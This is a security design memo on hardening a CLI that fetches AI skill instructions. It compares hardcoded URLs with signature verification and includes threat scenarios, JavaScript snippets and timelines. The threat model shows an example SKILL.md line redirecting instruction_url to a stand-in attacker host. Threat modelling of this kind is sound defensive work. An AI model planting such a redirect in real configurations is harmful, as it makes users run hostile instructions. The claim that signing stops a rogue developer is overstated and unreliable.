# Phase 2 Security: Visual Comparison

## Current Vulnerability (V1)

```
┌─────────────────────────────────────────────────────────────┐
│ User runs: npx @gaia/skills personality-analyzer           │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ CLI searches for SKILL.md in:                               │
│ 1. Local directory (if exists) ← VULNERABLE HERE!           │
│ 2. Cache                                                     │
│ 3. Package node_modules                                      │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ SKILL.md front matter (USER EDITABLE):                       │
│                                                               │
│ instruction_url: https://raw.githubusercontent.com/.../     │
│ ↑                                                             │
│ └─ User can edit this! ⚠️                                    │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Attacker modifies SKILL.md:                                  │
│                                                               │
│ instruction_url: https://attacker.com/malicious/INST.md    │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ CLI fetches from attacker's server ← NO POLICIES ❌          │
│ User executes skill without any constraints                  │
└─────────────────────────────────────────────────────────────┘
```

---

## Solution 1: Hardcoded URLs in CLI

```
┌─────────────────────────────────────────────────────────────┐
│ User runs: npx @gaia/skills personality-analyzer        │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ CLI checks hardcoded registry:                               │
│                                                               │
│ SKILL_URLS = {                                              │
│   'personality-analyzer': {                              │
│     instruction: 'https://raw.github...INSTRUCTION.md'     │
│   },                                                         │
│   ...                                                        │
│ }                                                            │
│                                                               │
│ ✅ URL is HARDCODED, not from SKILL.md                      │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Attacker tries to edit SKILL.md:                            │
│                                                               │
│ instruction_url: https://attacker.com/malicious/INST.md   │
│                                                               │
│ ⚠️ IGNORED! CLI uses hardcoded URL instead                 │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ CLI fetches from OFFICIAL GitHub only                        │
│ ✅ Policies enforced                                         │
│ ✅ User cannot bypass                                        │
└─────────────────────────────────────────────────────────────┘
```

---

## Solution 2: Signature Verification

```
┌─────────────────────────────────────────────────────────────┐
│ At Publish Time (GitHub Actions):                           │
│                                                               │
│ INSTRUCTION.md exists                                        │
│         ↓                                                     │
│ Calculate SHA256 hash                                        │
│         ↓                                                     │
│ Sign hash with private key → INSTRUCTION.md.sig             │
│         ↓                                                     │
│ Upload INSTRUCTION.md + INSTRUCTION.md.sig to GitHub       │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ At Runtime (User runs skill):                               │
│                                                               │
│ 1. Fetch INSTRUCTION.md from GitHub                         │
│ 2. Fetch INSTRUCTION.md.sig from GitHub                     │
│ 3. Fetch public_key.pem from repo                           │
│                                                               │
│ 4. Calculate hash of received INSTRUCTION.md                │
│ 5. Verify signature with public_key.pem                     │
│                                                               │
│    If hash matches ✅ → Continue                            │
│    If signature verifies ✅ → Continue                      │
│    Otherwise ❌ → REJECT (tampering detected!)              │
│                                                               │
│ 6. Execute skill (now guaranteed authentic)                 │
└─────────────────────────────────────────────────────────────┘
```

---

## Attack Scenarios Comparison

### Scenario 1: User Edits SKILL.md

```
Attack Method:
  Edit local SKILL.md to point to attacker's server

V1 Result:
  ❌ INSTRUCTION.md fetched from attacker
  ❌ No policies enforced
  ❌ Attack succeeds

V2A (Hardcoded URLs) Result:
  ✅ CLI ignores SKILL.md URL
  ✅ Uses hardcoded official URL
  ✅ Attack fails

V2B (Signatures) Result:
  ✅ Detects tampering (if attacker modified INSTRUCTION.md)
  ✅ Attack fails
```

### Scenario 2: Man-in-the-Middle (MITM) Attack

```
Attack Method:
  Network attacker intercepts HTTPS and modifies INSTRUCTION.md

V1 Result:
  ⚠️ HTTPS prevents some MITM, but not comprehensive
  ❌ If modified reaches CLI, no verification
  ⚠️ Risky

V2A (Hardcoded URLs) Result:
  ✅ HTTPS + hardcoded URL prevents MITM
  ✅ Attack becomes much harder

V2B (Signatures) Result:
  ✅ HTTPS + signatures prevent MITM
  ✅ Any modification is detected cryptographically
  ✅ Attack fails even if MITM succeeds at network level
```

### Scenario 3: Attacker Controls a Fork of the Repo

```
Attack Method:
  Malicious fork with different GitHub URLs

V1 Result:
  ❌ User clones malicious fork
  ❌ SKILL.md points to attacker's INSTRUCTION.md
  ❌ Attack succeeds

V2A (Hardcoded URLs) Result:
  ✅ CLI has official GitHub URLs hardcoded
  ✅ Fork's SKILL.md is ignored
  ✅ Attack fails

V2B (Signatures) Result:
  ✅ Attacker's INSTRUCTION.md won't verify
  ✅ Signature was made with official private key (which they don't have)
  ✅ Attack fails
```

### Scenario 4: Skill Developer Goes Rogue

```
Attack Method:
  Legitimate developer commits malicious INSTRUCTION.md

V1 Result:
  ❌ Malicious INSTRUCTION.md deployed to GitHub
  ❌ All users affected
  ❌ No detection mechanism

V2A (Hardcoded URLs) Result:
  ⚠️ Malicious INSTRUCTION.md still deployed
  ✅ But URL is hardcoded, so updated files are fetched
  ❌ Not effective against this threat

V2B (Signatures) Result:
  ✅ Requires signing with private key (in GitHub Secrets)
  ✅ Developer doesn't have access (only CI/CD does)
  ✅ Malicious code cannot be signed
  ✅ Or if detected in review, can revoke key
  ✅ More protection
```

---

## Implementation Comparison

### Approach 1: Hardcoded URLs

```javascript
// In CLI source code

const SKILL_URLS = {
  'personality-analyzer': 'https://raw.githubusercontent.com/CFH2026/gaia-agent-skills/main/gaia-instructions/personality-analyzer/INSTRUCTION.md',
  'modelhub-query-v2': 'https://raw.githubusercontent.com/CFH2026/gaia-agent-skills/main/gaia-instructions/modelhub-query-v2/INSTRUCTION.md',
  // Add here for each new skill
};

async function runSkill(skillName) {
  const url = SKILL_URLS[skillName];
  if (!url) {
    throw new Error(`Skill "${skillName}" not registered`);
  }
  
  // Fetch from OFFICIAL URL only
  const instruction = await fetch(url);
  // Execute...
}
```

**Pros:**
- Simple to understand
- One line of code per skill
- No cryptography needed
- Fast (no extra overhead)

**Cons:**
- Must update CLI for each skill
- Requires new CLI release
- Limited scalability
- Not flexible

---

### Approach 2: Signature Verification

```javascript
// In CLI source code

const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----`;

async function runSkill(skillName) {
  // Fetch INSTRUCTION.md
  const instruction = await fetch(instructionUrl);
  const content = await instruction.text();
  
  // Fetch signature
  const sigResponse = await fetch(instructionUrl + '.sig');
  const signature = await sigResponse.buffer();
  
  // Verify signature
  const verifier = crypto.createVerify('RSA-SHA256');
  verifier.update(content);
  const isValid = verifier.verify(PUBLIC_KEY, signature);
  
  if (!isValid) {
    throw new Error('Signature verification failed!');
  }
  
  // Execute...
}
```

**Pros:**
- Industry standard (GPG, npm, Docker use this)
- Scalable to unlimited skills
- Works with dynamic discovery
- No CLI updates needed for new skills
- Detects ALL tampering

**Cons:**
- More complex to implement
- Requires key management
- Extra network requests
- Slight performance overhead
- Requires understanding of crypto

---

## Timeline & Effort

### Approach 1: Hardcoded URLs

```
Day 1: Implementation
  □ Create SKILL_URLS registry (1 hour)
  □ Update runSkill() function (1 hour)
  □ Add tests (2 hours)
  □ Code review (1 hour)
  
Day 1-2: Testing
  □ Verify URL override fails (1 hour)
  □ Verify official URL works (1 hour)
  □ Integration tests (2 hours)
  
Day 2: Release
  □ Update documentation (1 hour)
  □ Release v2.1.0 (30 min)

Total: 1-2 days
```

### Approach 2: Signature Verification

```
Week 1: Setup
  □ Generate key pair (1 hour)
  □ Setup GitHub Secrets (1 hour)
  □ Create signing CI/CD job (3 hours)
  □ Test signing (2 hours)
  
Week 1: Implementation
  □ Add verification to CLI (4 hours)
  □ Handle signature failures (2 hours)
  □ Add tests (4 hours)
  □ Code review (2 hours)
  
Week 2: Testing & Docs
  □ Verify signature works (2 hours)
  □ Test key rotation (2 hours)
  □ Document procedures (3 hours)
  □ Create troubleshooting guide (2 hours)
  □ Release v2.2.0 (1 hour)

Total: 2-3 weeks
```

---

## My Recommendation

### For MVP/Short-term:
✅ **Implement Approach 1 (Hardcoded URLs)**
- Solves main vulnerability quickly
- Low risk, high confidence
- Can ship in 1-2 days
- Good enough for initial release

### For Production/Long-term:
✅ **Add Approach 2 (Signatures)**
- Industry standard security practice
- Scales to unlimited skills
- Worth the investment
- Add in next iteration (2-3 weeks)

### Best Security Posture:
✅ **Implement Both (Hybrid)**
- Defense in depth
- Cover all attack vectors
- Show security maturity
- Timeline: 3-4 weeks total

---

## Decision Questions

1. **How soon do you need security hardening?**
   - Immediately? → Approach 1 (2 days)
   - Next sprint? → Both approaches (3-4 weeks)

2. **Do you plan to support many skills?**
   - Few skills (<10)? → Approach 1 is fine
   - Many skills (>50)? → Approach 2 becomes necessary

3. **What's your risk tolerance?**
   - Low risk tolerance? → Both approaches
   - Moderate? → Approach 1 now, Approach 2 later

4. **Do you have security expertise on team?**
   - Yes? → Approach 2 is manageable
   - No? → Start with Approach 1, hire or train for Approach 2

---

## Recommended Path Forward

```
NOW (Week 1):
  ├─ Decide: Approach 1 only vs. Both?
  └─ If Approach 1: Implement hardcoded URLs
       └─ Complete in 1-2 days
       └─ Release as v2.1.0

NEXT SPRINT (Week 2-3):
  └─ If committing to security: Implement signatures
       ├─ Setup keys and CI/CD (Week 1 afternoon)
       ├─ Implement verification (Week 2)
       └─ Release as v2.2.0

FUTURE:
  ├─ Monitor security incidents
  ├─ Key rotation procedures
  ├─ Security audits
  └─ Consider hardware security module (HSM) for key storage
```

---

**Question for you:** Which approach do you want to pursue?
- Option A: Hardcoded URLs only (quick win)
- Option B: Both approaches (comprehensive, longer timeline)
